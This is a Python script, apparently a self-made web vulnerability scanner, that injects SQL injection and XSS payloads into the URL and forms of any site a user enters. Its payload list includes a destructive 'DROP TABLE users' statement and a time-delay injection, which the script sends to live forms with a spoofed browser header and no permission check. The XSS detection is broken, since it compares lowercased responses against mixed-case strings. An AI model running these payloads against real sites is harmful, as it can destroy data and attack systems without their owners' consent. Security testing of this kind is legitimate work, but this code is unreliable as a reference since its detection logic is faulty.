import requests  # Importing Libraries
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint

# List of common SQL error messages
sql_errors = {
    # MySQL
    "you have an error in your sql syntax;",
    "warning: mysql",
    # SQL Server
    "unclosed quotation mark after the character string",
    # Oracle
    "quoted string not properly terminated",
}

# Enhanced payloads for different types of SQL injection
sql_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "'; WAITFOR DELAY '0:0:5'; --",
    "' UNION SELECT null, null, null, null --",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "' OR '1'='1' /*",
    "' OR 'a'='a",
    "') OR ('1'='1' --",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1#",
    "' OR '1'='1#",
    "' OR '1'='1/*"
]

# XSS payloads
xss_payloads = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS');>",
    "'\"><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>"
]

class sqli_xss:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

    def get_page_source(self, url):
        try:
            response = self.session.get(url)
            response.raise_for_status()
            return response.text
        except requests.RequestException as e:
            print(f"Error fetching the page source: {e}")
            return None

    def get_forms(self, url):
        soup = bs(self.get_page_source(url), "html.parser")
        return soup.find_all("form")

    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({"type": input_type, "name": input_name, "value": input_value})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def is_sql_vulnerable(self, response):
        for error in sql_errors:
            if error in response.content.decode().lower():
                return True
        return False

    def is_xss_vulnerable(self, response):
        xss_errors = ["<script>alert('XSS');</script>", "<img src=x onerror=alert('XSS');>", "'\"><script>alert('XSS')</script>", "\"><script>alert('XSS')</script>"]
        for error in xss_errors:
            if error in response.content.decode().lower():
                return True
        return False

    def scan_sql(self, url):
        for payload in sql_payloads:
            new_url = f"{url}{payload}"
            res = self.session.get(new_url)
            if self.is_sql_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", new_url)
                return

        forms = self.get_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")
        for form in forms:
            form_details = self.get_form_details(form)
            for payload in sql_payloads:
                data = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        data[input_tag["name"]] = input_tag["value"] + payload
                    elif input_tag["type"] != "submit":
                        data[input_tag["name"]] = f"test{payload}"
                target_url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    res = self.session.post(target_url, data=data)
                elif form_details["method"] == "get":
                    res = self.session.get(target_url, params=data)
                if self.is_sql_vulnerable(res):
                    print("[+] SQL Injection vulnerability detected, link:", target_url)
                    print("[+] Form:")
                    pprint(form_details)
                    return

        print("[-] No SQL Injection vulnerabilities detected.")

    def scan_xss(self, url):
        forms = self.get_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")
        for form in forms:
            form_details = self.get_form_details(form)
            for payload in xss_payloads:
                data = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        data[input_tag["name"]] = input_tag["value"] + payload
                    elif input_tag["type"] != "submit":
                        data[input_tag["name"]] = f"test{payload}"
                target_url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    res = self.session.post(target_url, data=data)
                elif form_details["method"] == "get":
                    res = self.session.get(target_url, params=data)
                if self.is_xss_vulnerable(res):
                    print("[+] XSS vulnerability detected, link:", target_url)
                    print("[+] Form:")
                    pprint(form_details)
                    return

        print("[-] No XSS vulnerabilities detected.")

def main():
    print("Select the type of scan:")
    print("1. SQL Injection")
    print("2. XSS")
    choice = input("Enter your choice (1/2): ")
    
    url = input("Enter the URL: ")
    detector = sqli_xss(url)
    
    if choice == '1':
        detector.scan_sql(url)
    elif choice == '2':
        detector.scan_xss(url)
    else:
        print("Invalid choice. Please select 1 for SQL Injection or 2 for XSS.")

if __name__ == "__main__":
    main()
